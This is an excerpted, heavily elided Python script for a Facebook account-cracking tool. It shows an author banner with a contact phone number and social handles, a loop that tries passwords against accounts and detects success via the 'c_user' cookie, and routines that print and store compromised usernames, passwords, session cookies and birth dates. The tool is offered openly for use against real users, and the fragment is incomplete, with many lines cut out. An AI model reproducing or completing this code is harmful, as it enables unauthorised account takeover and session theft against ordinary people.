...
\033[1;92m╔═══o00════════00o═════════════════╗
\033[1;92m [•] \033[1;31;1mAuthor    : \033[1;92m  MD Riyadul Momin
\033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m +17867244875   
\033[1;92m [•] \033[1;31;1mFacebook  :\033[1;92m  facebook.com/Itz.riad.khule.khele.dibo
\033[1;92m [•] \033[1;31;1mGithub    : \033[1;92m Github.com/Rk-Black/
\033[1;92m [•] \033[1;31;1mVersion   : \033[1;92m 0.3 Beta Test
\033[1;92m╚═════════════════════════════════╝""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Strovmirviaska Compleated...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}Strvmeta1.py{N}'");exit()
        else:
        ...
        try:
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        print('\r %s[RIYAD-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}\n')
                    elif "y" in Apk:
                        print(f'\r %s[RIYAD-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[RIYAD-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    ...
                    try:
                        ...
                        print('\r %s[RIYAD-CP] %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[RIYAD-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
...
def result():
	os.system("clear")
	logo()
	print(f'[1]. RIYAD OK Anda ')
	print(f'[2]. RIYAD CP Anda ')
	print('[3]. Kembali	')
	kz = input(f'\n<\> Pilih : ')
	if kz in ['2']:
...
def infoauthor():
        ...
        if upd =="":
            ...
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
            jalan(' %s[%s✓%s] Silahkam Gunakan"%sTools Scrip Ini !%s"'%(N,H,N,H,N));file()
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong")   
